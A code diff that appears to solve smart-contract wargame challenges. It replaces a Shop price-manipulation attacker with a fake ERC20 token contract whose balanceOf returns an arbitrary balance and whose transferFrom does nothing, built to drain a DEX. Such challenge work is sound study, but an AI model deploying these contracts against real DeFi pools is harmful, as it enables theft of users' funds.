@@ -1,29 +1,31 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import "../interfaces/shop.sol";
-
 /**
- * this contract will use the change of the target contract state variable isSold 
- * in order return a different price the second time the function price() is called
+ * this contract is a fake token, with the 2 functions called by the target
+ * will return a balanceOf() superior to the amount traded, 
+ * then will not transfer anything (fake transferFrom function).
  */
-contract shopAttack {
+contract dexTwoAttack {
 
     // address payable public target;
-    Shop public immutable target;
-    constructor(address payable targetAddress) {
-      target = Shop(targetAddress);
+    // Shop public immutable target;
+    uint256 balance;
+    constructor(uint256 _balance) {
+      balance=_balance;
     }
 
-  function attack() external {
-    target.buy();
+  // fake balanceOf function, with same declaration as in IERC20 token contract
+  function balanceOf(address account) external view returns (uint256) {
+    return balance;
   }
 
-  function price() external view returns (uint) {
-      if(target.isSold() == true) {
-      return 1;
-      }
-    return 101;
+  // fake transferFrom function, with same declaration as in IERC20 token contract
+    function transferFrom(
+        address from,
+        address to,
+        uint256 amount
+    ) external returns (bool) {
+    return true;
   }
-
 }
